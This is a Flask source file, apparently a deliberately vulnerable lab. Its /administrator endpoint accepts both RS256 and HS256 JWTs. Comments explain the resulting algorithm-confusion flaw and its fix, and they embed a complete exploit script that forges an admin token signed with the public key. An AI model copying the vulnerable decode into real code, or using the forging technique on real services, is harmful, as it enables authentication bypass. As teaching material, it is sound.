from flask import Flask, request, jsonify
import jwt
import os

# ============================================================
# VULNERABILITY: JWT Algorithm Confusion (RS256 → HS256)
# ---------------------------------------------------------------
# The server accepts BOTH RS256 and HS256 in algorithms=[].
# An attacker can:
#   1. Grab the RSA PUBLIC KEY (often publicly available).
#   2. Sign a new JWT with HS256 using the PUBLIC KEY as the
#      HMAC secret — the server will accept it because it
#      tries both algorithms.
#   3. Set role=admin in the payload.
#
# FIX: Accept ONLY 'RS256' in the algorithms list.
# ============================================================
# ============================================================
# Exploit.py fully automated
# # #!/usr/bin/env python3
# """
# exploit.py – Demonstrates JWT Algorithm Confusion Attack

# Steps:
#   1. Generates a test RSA keypair (simulates a leaked/public key)
#   2. Starts the Flask app with the public key set as RSA_PUBLIC_KEY
#   3. Signs a forged admin token with HS256 using the PUBLIC key as secret
#   4. Sends it to /administrator and receives admin access
# """

# import subprocess, os, sys, time, requests
# from cryptography.hazmat.primitives import serialization
# from cryptography.hazmat.primitives.asymmetric import rsa
# from cryptography.hazmat.backends import default_backend
# import jwt

# # ---------- 1. Generate RSA keypair ----------
# private_key = rsa.generate_private_key(
#     public_exponent=65537, key_size=2048, backend=default_backend()
# )
# public_key_pem = private_key.public_key().public_bytes(
#     encoding=serialization.Encoding.PEM,
#     format=serialization.PublicFormat.SubjectPublicKeyInfo
# ).decode()

# print("[*] Generated RSA keypair")
# print(f"[*] Public Key:\n{public_key_pem}")

# # ---------- 2. Start Flask server in background ----------
# env = os.environ.copy()
# env['RSA_PUBLIC_KEY'] = public_key_pem

# server = subprocess.Popen(
#     [sys.executable, 'app.py'],
#     env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
# )
# time.sleep(2)
# print("[*] Flask server started on :1337")

# try:
#     # ---------- 3. Forge HS256 token using public key as HMAC secret ----------
#     forged_token = jwt.encode(
#         {"role": "admin"},
#         public_key_pem,     # ← using RSA PUBLIC key as HS256 secret
#         algorithm="HS256"
#     )
#     print(f"[*] Forged HS256 token: {forged_token}")

#     # ---------- 4. Send to /administrator ----------
#     r = requests.get(
#         'http://localhost:1337/administrator',
#         headers={'Authorization': f'Bearer {forged_token}'}
#     )
#     print(f"[*] Response ({r.status_code}): {r.json()}")
# finally:
#     server.terminate()
# ============================================================

app = Flask(__name__)

@app.route('/administrator', methods=['GET'])
def get_admin_interface():
    auth_header = request.headers.get('Authorization')

    if not auth_header or not auth_header.startswith('Bearer '):
        return jsonify({
            "error": "Your session has expired. Please sign in to continue."
        }), 401

    token = auth_header.split(' ')[1]
    try:
        # VULNERABLE: accepts both RS256 and HS256
        decoded = jwt.decode(
            token,
            os.environ.get('RSA_PUBLIC_KEY'),
            algorithms=['RS256', 'HS256']   # ← attacker can use HS256 + pubkey as secret
        )

        if decoded.get('role') != 'admin':
            return jsonify({"error": "Requested resource not found."}), 401

        return jsonify({"success": True})   # Return administrator interface

    except jwt.ExpiredSignatureError:
        return jsonify({"error": "Your session has expired. Please sign in to continue."}), 401
    except jwt.InvalidTokenError:
        return jsonify({"error": "Your session has expired. Please sign in to continue."}), 401

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337, debug=False)
